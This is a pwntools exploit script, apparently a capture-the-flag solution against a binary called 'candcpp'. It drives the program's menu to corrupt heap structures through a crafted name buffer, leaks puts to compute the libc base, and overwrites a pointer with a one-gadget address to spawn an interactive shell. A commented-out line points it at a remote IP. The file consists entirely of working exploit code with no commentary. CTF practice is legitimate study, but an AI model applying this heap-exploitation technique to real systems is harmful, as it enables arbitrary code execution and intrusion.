from pwn import *
main=0x0000000004009A0
leak=0x000000000400E10
name=0x000000000602328
def set_name(name):
	p.sendafter("name: ",name)
def cmd(c):
	p.sendlineafter(">> ",str(c))
def add(l,s="1\n"):
	cmd(1)
	p.sendlineafter("string\n",str(l))
	p.sendafter("string\n",s)
def new(l,s):
	cmd(3)
	p.sendlineafter("string\n",str(l))
	p.sendafter("string\n",s)
def free(idx):
	cmd(2)
	p.sendlineafter("string\n",str(idx))
def delete(idx):
	cmd(4)
	p.sendlineafter("string\n",str(idx))
def show(idx):
	cmd(5)
	p.sendlineafter("string\n",str(idx))
#context.log_level='debug'
libc=ELF("./candcpp").libc
p=process("./candcpp")
#p=remote("154.8.222.144",9999)
set_name(p64(main)+p64(leak)[:-1]+"\n")
add(0xf,p64(0xdeadbeef)+"\n")
add(0x1b0,"\n")
add(0x1a0,p64(name)+p64(name+8)[:-1]+p64(name+8)+"B"*8+"C"*7+p64(name)+"\n")
delete(0)
base=int(p.readline(),16)-libc.symbols['puts']
log.warning(hex(base))
set_name(p64(0xf02a4+base)+p64(leak)[:-1]+"\n")
add(0xf,p64(0xdeadbeef)+"\n")
add(0x1b0,"\n")
add(0x1a0,p64(name)+p64(0xdeadbeef)[:-1]+p64(name)+"B"*8+"C"*7+p64(0xcafebabe)+"\n")
delete(0)
p.interactive()
